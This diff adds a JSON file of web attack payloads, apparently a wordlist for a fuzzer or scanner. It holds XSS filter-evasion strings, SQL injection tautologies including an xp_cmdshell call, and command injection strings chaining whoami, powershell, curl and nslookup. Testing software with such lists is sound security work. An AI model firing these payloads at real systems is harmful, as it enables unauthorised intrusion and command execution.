@@ -1,0 +1,28 @@
+{
+  "xss": [
+    "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    "<svg><script>/*</script>alert(1)//</script>",
+    "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
+    "<img src='x' onerror='&#x61;lert(1)'>",
+    "<svg/onload=&#x61;lert`1`>",
+    "<body/onload!#$%&()*~+-_.,:;?@[/\\]^`{|}=alert(1)>"
+  ],
+  "sqli": [
+    "' OR '1'='1' --+",
+    "' /*!OR*/ '1'='1'",
+    "' OR 1=1#",
+    "' or 1=1-- -",
+    "' OR 1=1 LIMIT 1;--",
+    "' OR 1=1 /*",
+    "'or'1'='1",
+    "'; exec xp_cmdshell('whoami');--"
+  ],
+  "cmdi": [
+    "`whoami`",
+    "|| whoami",
+    "& ping -n 1 127.0.0.1 &",
+    "| powershell -Command \"whoami\"",
+    "; curl 127.0.0.1",
+    "&& nslookup example.com"
+  ]
+}
